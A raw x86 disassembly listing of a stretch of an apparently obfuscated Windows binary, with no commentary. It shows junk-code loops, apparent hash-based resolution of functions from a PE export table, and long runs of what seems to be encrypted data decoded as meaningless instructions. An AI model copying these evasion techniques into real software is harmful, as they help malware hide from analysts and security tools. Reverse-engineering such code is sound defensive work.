  4100dc:	cmp    DWORD PTR ds:0x43365f,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x43365f,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x43365f,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x43365f
  410111:	inc    eax
  410112:	mov    ds:0x43365f,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x4336f3
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x4335d7,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x43365f,0x433663
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x4335cf,0x4335c7
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x433667,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x4336a3,0x4336d7
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x4336d7,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433617
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x4336a3,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x4335d7,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x4336f7
  4101b6:	mov    esi,DWORD PTR ds:0x43370b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x4335e3,0x43361b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x4336b3,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x4336b3
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x4336b3,ecx
  4101f0:	cmp    DWORD PTR ds:0x4336b3,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433894
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x4336b3,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x4336e3,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x4336d7,0x0
  410260:	mov    ecx,DWORD PTR ds:0x4336d7
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x4336d7,ecx
  41026d:	cmp    DWORD PTR ds:0x4336d7,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x4336d7,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x4336d7
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x4336d7,ecx
  4102a4:	cmp    DWORD PTR ds:0x4336d7,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x4336a3,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x4336a3
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x4336a3,ecx
  4102d3:	cmp    DWORD PTR ds:0x4336a3,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x4336a3,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x43366b
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x4336ab,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x433663,0x4335c7
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x4336b3,0x0
  410325:	mov    eax,ds:0x4336b3
  41032a:	inc    eax
  41032b:	mov    ds:0x4336b3,eax
  410330:	cmp    DWORD PTR ds:0x4336b3,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x4336b3,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x4336b3
  41035a:	inc    eax
  41035b:	mov    ds:0x4336b3,eax
  410360:	cmp    DWORD PTR ds:0x4336b3,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x433663
  410379:	sbb    eax,DWORD PTR ds:0x4336e3
  41037f:	mov    ds:0x433663,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x43362b
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x4335e7,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x4335c7,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x4335c7
  4103ba:	inc    eax
  4103bb:	mov    ds:0x4335c7,eax
  4103c0:	cmp    DWORD PTR ds:0x4335c7,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x4335c7,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x4335c7,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x4335c7
  4103f8:	inc    eax
  4103f9:	mov    ds:0x4335c7,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x4336d7,0x1e
  41040d:	cmp    DWORD PTR ds:0x4336d7,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x4336d7,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x4338f4
  41042f:	push   0x4335df
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x4336d7,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x4336d7
  41044c:	dec    eax
  41044d:	mov    ds:0x4336d7,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x4336d7
  41045a:	dec    eax
  41045b:	mov    ds:0x4336d7,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x4336d7,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x433627,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43361b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x433663,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	mov    cl,BYTE PTR [ebp-0x21]
  4104bf:	scas   al,BYTE PTR es:[edi]
  4104c0:	cdq    
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	jnp    0x410534
  4104ca:	push   0x164a5b26
  4104cf:	jno    0x41049e
  4104d1:	xchg   esp,eax
  4104d2:	mov    eax,ds:0x52185ed2
  4104d7:	dec    ebx
  4104d8:	shl    ebp,0xe
  4104db:	gs push es
  4104dd:	shl    DWORD PTR [ecx+ebx*8],1
  4104e0:	imul   edx,DWORD PTR [edx],0x9b11cdde
  4104e6:	sub    ecx,esp
  4104e8:	jge    0x41047d
  4104ea:	jae    0x4104be
  4104ec:	repnz push eax
  4104ee:	push   ebp
  4104ef:	push   0x33
  4104f1:	sub    cl,dh
  4104f3:	push   ds
  4104f4:	std    
  4104f5:	adc    BYTE PTR [edi-0x51338039],al
  4104fb:	outs   dx,BYTE PTR es:[esi]
  4104fd:	dec    ecx
  4104fe:	mov    bl,ch
  410500:	cmp    ebp,ecx
  410502:	sbb    DWORD PTR [eax+edi*1+0x67],eax
  410506:	mov    ebx,0x81212abf
  41050b:	add    cl,bl
  41050d:	sbb    BYTE PTR [ebx-0x1e4ebbb5],bh
  410513:	mov    eax,DWORD PTR [edx]
  410515:	scas   eax,DWORD PTR es:[edi]
  410516:	sbb    dh,ch
  410518:	xchg   ch,dh
  41051a:	jb     0x410557
  41051c:	add    cl,BYTE PTR [esi*2+0x61b568e5]
  410523:	enter  0x996a,0x65
  410527:	bound  esi,QWORD PTR [ecx-0x6d50909e]
  41052d:	push   edx
  41052e:	ins    DWORD PTR es:[edi],dx
  41052f:	sbb    eax,0xcc814ba2
  410534:	into   
  410535:	shr    BYTE PTR [edi-0x6a],1
  410538:	mov    bl,0x5
  41053a:	sbb    al,0xcd
  41053c:	sub    al,0xab
  41053e:	cs stc 
  410540:	call   0x60c:0xdedaeca3
  410547:	je     0x4104e7
  410549:	je     0x4104d7
  41054b:	sub    eax,0xa7286b32
  410550:	jo     0x62e6772c
  410556:	jp     0x4104e1
  410558:	pop    ebp
  410559:	jecxz  0x41057a
  41055b:	fcom   DWORD PTR [eax-0x78061b9d]
  410561:	fisubr DWORD PTR [ebx+0x30]
  410564:	int    0xb2
  410566:	cli    
  410567:	xchg   ecx,eax
  410568:	cli    
  410569:	and    eax,0xef09f771
  41056e:	imul   edx,DWORD PTR [ecx-0x75a284f8],0x6677f9d9
  410578:	(bad)  
  410579:	mov    ebp,0x4cb90d8b
  41057e:	mov    esp,0x311a5c8a
  410583:	dec    eax
  410584:	add    al,0x2a
  410586:	mov    ecx,0xa3bb7d02
  41058b:	ret    0xea4c
  41058e:	jp     0x44266156
  410594:	imul   edx,DWORD PTR [edx+0x32],0x51ac9740
  41059b:	jne    0x41052e
  41059d:	dec    esp
  41059e:	jl     0x4105e8
  4105a0:	daa    
  4105a1:	in     al,dx
  4105a2:	push   0xac767c8c
  4105a7:	xor    BYTE PTR [ecx-0x54],dh
  4105aa:	fcom   st(0)
  4105ac:	xor    ecx,ebx
  4105ae:	(bad)  
  4105af:	sub    eax,0xb571f14b
  4105b4:	jb     0x410630
  4105b6:	or     BYTE PTR [ebx+0x5789fd36],ch
  4105bc:	inc    ebp
  4105bd:	outs   dx,BYTE PTR ds:[esi]
  4105be:	sbb    BYTE PTR [ecx+esi*8],al
  4105c1:	xchg   edx,eax
  4105c2:	mov    ds:0x9fcc7c1e,eax
  4105c7:	lahf   
  4105c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c9:	dec    ebx
  4105ca:	dec    esi
  4105cb:	sti    
  4105cc:	not    BYTE PTR [edx+0x2b]
  4105cf:	retf   0x3fb3
  4105d2:	sbb    eax,0xc4c5bd07
  4105d7:	hlt    
  4105d8:	xchg   esp,eax
  4105d9:	push   eax
  4105da:	test   al,0x50
  4105dc:	int3   
  4105dd:	ins    BYTE PTR es:[edi],dx
  4105de:	retf   
  4105df:	(bad)
  4105e3:	ror    BYTE PTR [ebx],1
  4105e5:	push   ecx
  4105e6:	mov    eax,DWORD PTR [ebp-0x4]
  4105e9:	sbb    DWORD PTR ds:0x433657,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x4335cf,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x4336af
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x4336af,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x43365f,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x410668
  410648:	inc    eax
  410649:	fwait
  41064a:	xor    edi,DWORD PTR [edi+0x127c7cb9]
  410650:	jg     0x4106ce
  410652:	jl     0x4105e2
  410654:	les    ecx,FWORD PTR [ebp+0x30]
  410657:	push   es
  410658:	xchg   esp,edi
  41065a:	mov    ebx,ecx
  41065c:	mov    ch,0x51
  41065e:	pop    ebx
  41065f:	(bad)  
  410660:	icebp  
  410661:	or     eax,0xc607b3ee
  410666:	or     DWORD PTR [ebx],eax
  410668:	add    DWORD PTR [edi-0x561325bf],edi
  41066e:	dec    esp
  41066f:	(bad)  
  410670:	push   ss
  410671:	and    dl,ch
  410673:	jne    0x410602
  410675:	(bad)
  410679:	dec    esi
  41067a:	outs   dx,DWORD PTR ds:[esi]
  41067b:	and    DWORD PTR [esp+ebx*1],eax
  41067e:	gs jg  0x4106dd
  410681:	mov    ebx,0xa8ab4337
  410686:	stc    
  410687:	pop    esi
  410688:	or     ebx,DWORD PTR [ebx+eiz*1+0x69]
  41068c:	pusha  
  41068d:	shr    DWORD PTR ds:0x743f6f98,1
  410693:	dec    ecx
  410694:	(bad)
  410699:	sti    
  41069a:	sub    BYTE PTR [esi+0x15b96cab],bl
  4106a0:	cli    
  4106a1:	adc    al,0xf8
  4106a3:	ins    BYTE PTR es:[edi],dx
  4106a4:	pop    ebp
  4106a5:	mov    ds:0x492906b2,eax
  4106aa:	arpl   WORD PTR [esi+ecx*1],bx
  4106ad:	inc    esp
  4106ae:	adc    esi,edx
  4106b0:	pop    ebx
  4106b1:	or     DWORD PTR [esi],ebx
  4106b3:	std    
  4106b4:	sub    esi,edi
  4106b6:	pusha  
  4106b7:	addr16 sub bh,0xa3
  4106bb:	mov    ebp,0xb2186fde
  4106c0:	push   es
  4106c1:	gs repnz and al,ah
  4106c5:	dec    edx
  4106c6:	call   0x4e3da06f
  4106cb:	push   es
  4106cc:	pop    ds
  4106cd:	dec    ebx
  4106ce:	mov    esi,DWORD PTR [edi+0x404c2879]
  4106d4:	pop    ebx
  4106d5:	xlat   BYTE PTR ds:[ebx]
  4106d6:	fmul   QWORD PTR [ebx]
  4106d8:	out    0xd6,al
  4106da:	out    0xd7,al
  4106dc:	psubsw mm0,QWORD PTR [edx+0xb]
  4106e0:	aaa    
  4106e1:	call   0x9970a429
  4106e6:	and    eax,0x47fac536
  4106eb:	stc    
  4106ec:	and    bh,BYTE PTR [ebx+edx*8]
  4106ef:	mov    bh,0xf6
  4106f1:	add    ah,dh
  4106f3:	jo     0x410769
  4106f5:	mov    ah,0x34
  4106f7:	gs inc eax
  4106f9:	or     BYTE PTR [esi],0x47
  4106fc:	mov    bl,0xaa
  4106fe:	call   0x1f8bc7f6
  410703:	retf   0xd378
  410706:	cmp    eax,0x77190c03
  41070b:	shr    DWORD PTR [ebx],1
  41070d:	mov    dh,0xbe
  41070f:	(bad)  
  410710:	xchg   esi,eax
  410711:	ins    BYTE PTR es:[edi],dx
  410712:	pop    ds
  410713:	jbe    0x410724
  410715:	add    eax,0x89e0ab63
  41071a:	push   0xfffffff8
  41071c:	xchg   ecx,eax
  41071d:	leave  
  41071e:	inc    eax
  41071f:	(bad)  
  410720:	mov    cl,0xe9
  410722:	sbb    al,0x3b
  410724:	mov    ebx,0xf7ea8d02
  410729:	push   ebx
  41072a:	xchg   esi,eax
  41072b:	inc    edi
  41072c:	retf   0x1470
  41072f:	jl     0x410752
  410731:	xchg   BYTE PTR [edx-0x50579459],al
  410737:	repz ja 0x410799
  41073a:	ss dec esp
  41073c:	fcmovbe st,st(7)
  41073e:	inc    ebp
  41073f:	loop   0x4107a5
  410741:	xchg   edi,eax
  410742:	dec    ecx
  410743:	and    ebx,DWORD PTR ds:0x5389
  410748:	test   al,0x7b
  41074a:	jbe    0x410722
  41074c:	push   0x787dc0d7
  410751:	call   0x5324:0x20c47b85
  410758:	cmp    BYTE PTR ds:0xa96cbca1,0xe
  41075f:	bound  ebp,QWORD PTR [ebx]
  410761:	pop    ds
  410762:	adc    DWORD PTR [ebp-0x76a9a977],eax
  410768:	aaa    
  410769:	test   eax,0xc8ffa1f9
  41076e:	add    ch,dh
  410770:	int    0x8b
  410772:	dec    ebp
  410773:	in     al,dx
  410774:	add    DWORD PTR ds:0x4335e7,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x4335e3,0x4335cf
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x433623,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x4336e3
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0xe7b4ac5a,eax
  4107e5:	xchg   esp,eax
  4107e6:	gs pop ebp
  4107e8:	mov    eax,0x7f127c7c
  4107ed:	jl     0x41086b
  4107ef:	jge    0x41085b
  4107f1:	jge    0x410795
  4107f3:	and    BYTE PTR [eax+0x3f8fceba],cl
  4107f9:	test   DWORD PTR [eax-0x80],0x9d4e5efd
  410800:	cld    
  410801:	fmul   QWORD PTR [edx]
  410803:	ds addr16 (bad) 
  410806:	mov    eax,ds:0xdd49c0d0
  41080b:	or     al,0x4d
  41080d:	xchg   edi,eax
  41080e:	xchg   edx,eax
  41080f:	dec    edx
  410810:	sbb    DWORD PTR [ecx+0x7bbbd4e6],eax
  410816:	in     eax,0x3
  410818:	test   DWORD PTR [ebp+ecx*8+0x6f],ebp
  41081c:	add    edi,ecx
  41081e:	inc    ebp
  41081f:	inc    eax
  410820:	js     0x410884
  410822:	shr    DWORD PTR [ecx-0x7],cl
  410825:	push   eax
  410826:	push   edx
  410827:	sbb    edi,DWORD PTR [edi]
  410829:	sahf   
  41082a:	jns    0x410815
  41082c:	mov    ebx,0x1bb645ab
  410831:	xchg   edi,eax
  410832:	mov    esi,0xb83c894a
  410837:	xrelease mov BYTE PTR [esi],bh
  41083a:	mov    ch,BYTE PTR [edi+0x5e7269f]
  410840:	pop    ss
  410841:	pop    ss
  410842:	add    BYTE PTR [eax-0x5e12e46d],0x45
  410849:	xor    BYTE PTR [edi-0x59f69430],bl
  41084f:	aam    0x66
  410851:	popf   
  410852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410853:	mov    dh,0x51
  410855:	sub    al,BYTE PTR [eax-0x3a0bd2cf]
  41085b:	mov    ds:0xc72a40d7,eax
  410860:	leave  
  410861:	and    ch,ch
  410863:	stc    
  410864:	cs mov ch,0x9d
  410867:	or     dh,BYTE PTR [edi-0x5a0c819e]
  41086d:	xchg   edi,eax
  41086e:	test   al,0xfe
  410870:	mov    edi,0xad0ece7a
  410875:	dec    ebx
  410876:	mov    bh,cl
  410878:	pop    ecx
  410879:	popa   
  41087a:	aas    
  41087b:	cmp    eax,0xb40a123d
  410880:	retf   0xdaa7
  410883:	sub    esp,DWORD PTR [edx]
  410885:	mov    dh,0x19
  410887:	inc    esp
  410888:	add    DWORD PTR [ebx],esi
  41088a:	daa    
  41088b:	xchg   edi,eax
  41088c:	or     BYTE PTR [ecx+0x5],al
  41088f:	inc    ecx
  410890:	in     eax,0x87
  410892:	dec    edi
  410893:	popa   
  410894:	iret   
  410895:	repnz or BYTE PTR [ecx-0x2e377386],0x5c
  41089d:	pop    ecx
  41089e:	pop    esp
  41089f:	sahf   
  4108a0:	pop    ebp
  4108a1:	inc    ebx
  4108a2:	lods   al,BYTE PTR ds:[esi]
  4108a3:	mov    ebp,0x7257366e
  4108a8:	mov    cl,0x98
  4108aa:	fmul   QWORD PTR [eax]
  4108ac:	shr    DWORD PTR [ecx],0xab
  4108af:	cmp    esp,edi
  4108b1:	leave  
  4108b2:	jmp    0x7956e8dd
  4108b7:	les    eax,FWORD PTR [edi+ecx*1+0x520a5435]
  4108be:	cld    
  4108bf:	xchg   ecx,eax
  4108c0:	and    eax,0x3c1f8762
  4108c5:	daa    
  4108c6:	into   
  4108c7:	mov    ecx,0x252b568b
  4108cc:	rol    DWORD PTR ds:0xac6c0bf2,0x47
  4108d3:	jge    0x410909
  4108d5:	mov    edi,0x761178db
  4108da:	lock adc edi,DWORD PTR [esi]
  4108dd:	sub    eax,DWORD PTR es:[eax+0x78921fb4]
  4108e4:	fcomp  DWORD PTR [ecx-0x7e2c9b12]
  4108ea:	pop    esp
  4108eb:	ret    0x754d
  4108ee:	pop    ebx
  4108ef:	xor    al,0xed
  4108f1:	jnp    0x4108f2
  4108f3:	mov    WORD PTR [ebx],?
  4108f5:	and    ebx,DWORD PTR [ebx+0xc7c7ed2]
  4108fb:	push   esi
  4108fc:	jb     0x410973
  4108fe:	jp     0x4108a2
  410900:	sar    BYTE PTR [edx+0x74d2de6c],0xb2
  410907:	jle    0x410937
  410909:	daa    
  41090a:	adc    esp,DWORD PTR [ebx+0x84d8b50]
  410910:	add    ecx,DWORD PTR [eax+edi*4]
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [edx+edi*2-0x448c0c92],bl
  4109a3:	jl     0x410a21
  4109a5:	adc    bh,BYTE PTR [edi+0x7c]
  4109a8:	jl     0x410971
  4109aa:	loopne 0x4109b8
  4109ac:	adc    DWORD PTR [esi-0x1cf86138],0x7239e55e
  4109b6:	mov    ch,al
  4109b8:	push   esp
  4109b9:	inc    ebp
  4109ba:	mov    edi,0xb811acfc
  4109bf:	fstp   TBYTE PTR [edx+0x57c16fa1]
  4109c5:	push   edx
  4109c6:	arpl   WORD PTR [esi],cx
  4109c8:	aam    0x71
  4109ca:	in     eax,dx
  4109cb:	ret    0xee97
  4109ce:	shl    BYTE PTR [edi-0x4d],cl
  4109d1:	mov    dl,BYTE PTR [edx-0x32]
  4109d4:	imul   ecx,DWORD PTR [ecx],0x7a947cf0
  4109da:	je     0x4109fc
  4109dc:	test   DWORD PTR [ecx+0x3a79864d],edi
  4109e2:	push   es
  4109e3:	popf   
  4109e4:	mov    edx,0x7568fbf1
  4109e9:	mov    al,0x17
  4109eb:	xor    BYTE PTR [ecx+edi*2+0x59],al
  4109ef:	in     al,dx
  4109f0:	push   esp
  4109f1:	cwde   
  4109f2:	(bad)  
  4109f3:	loopne 0x4109ba
  4109f5:	call   0xb4e8f6fc
  4109fa:	popa   
  4109fb:	in     eax,dx
  4109fc:	test   al,0x58
  4109fe:	dec    edi
  4109ff:	pop    edi
  410a00:	jge    0x410a1f
  410a02:	inc    edx
  410a03:	test   BYTE PTR [ebp-0x37],cl
  410a06:	push   es
  410a07:	shl    DWORD PTR [eax],0xaa
  410a0a:	je     0x410a68
  410a0c:	push   ebx
  410a0d:	push   ss
  410a0e:	push   ss
  410a0f:	(bad)  
  410a11:	xchg   edi,eax
  410a12:	imul   eax,DWORD PTR [edi],0xffffff88
  410a15:	daa    
  410a16:	mov    eax,0xc7dfe594
  410a1b:	fwait
  410a1c:	pop    ebp
  410a1d:	outs   dx,BYTE PTR ds:[esi]
  410a1e:	js     0x410a67
  410a20:	inc    ebx
  410a21:	push   ss
  410a22:	call   0x11a6:0x7a3cc1b1
  410a29:	icebp  
  410a2a:	pop    eax
  410a2b:	gs mov edi,0xef994396
  410a31:	nop
  410a32:	lods   eax,DWORD PTR ds:[esi]
  410a33:	xchg   ecx,eax
  410a34:	out    dx,al
  410a35:	jg     0x410a6e
  410a37:	mov    esp,eax
  410a39:	adc    BYTE PTR [ebx-0x51f8055],0x79
  410a40:	rol    DWORD PTR ds:0xd3483c0a,1
  410a46:	fistp  WORD PTR [edi+eax*2+0x70]
  410a4a:	or     eax,0x103d7ca4
  410a4f:	add    al,0x2d
  410a51:	into   
  410a52:	lea    edi,[ebp-0x7d]
  410a55:	jbe    0x410ac0
  410a57:	mov    ecx,0x59d1df6c
  410a5c:	aam    0x3
  410a5e:	popa   
  410a5f:	mov    ah,0x6e
  410a61:	ins    BYTE PTR es:[edi],dx
  410a62:	xchg   ebx,eax
  410a63:	out    dx,al
  410a64:	xchg   DWORD PTR [eax-0x6e786702],edi
  410a6a:	xor    DWORD PTR [ecx],0x33151e97
  410a70:	imul   edx,DWORD PTR ds:0x822d2324,0x4fb0b89f
  410a7a:	icebp  
  410a7b:	push   ebp
  410a7c:	loop   0x410a81
  410a7e:	mov    bh,0x3a
  410a80:	fdiv   DWORD PTR ds:0x1cc6818c
  410a87:	sub    eax,0x8ca73f2a
  410a8c:	jne    0x410b0a
  410a8e:	loop   0x410ae7
  410a90:	add    bl,BYTE PTR [ecx-0x5c81f7ba]
  410a96:	mov    dh,0x58
  410a98:	jne    0x410ab4
  410a9a:	push   edi
  410a9b:	test   eax,0x1d433d3b
  410aa0:	and    ch,ah
  410aa2:	mov    al,ds:0x343d44f1
  410aa7:	scas   eax,DWORD PTR es:[edi]
  410aa8:	sub    DWORD PTR [eax],ebx
  410aaa:	jb     0x410a5b
  410aac:	push   0x886a77c8
  410ab1:	xor    eax,0x53a15fb8
  410ab6:	inc    eax
  410ab7:	not    DWORD PTR [esi+0x16]
  410aba:	dec    edi
  410abb:	jge    0x410ae7
  410abd:	dec    ebp
  410abe:	iret   
  410abf:	xchg   ebp,eax
  410ac0:	push   ss
  410ac1:	push   edi
  410ac2:	rcl    DWORD PTR fs:[eiz*8+0x84503d9],1
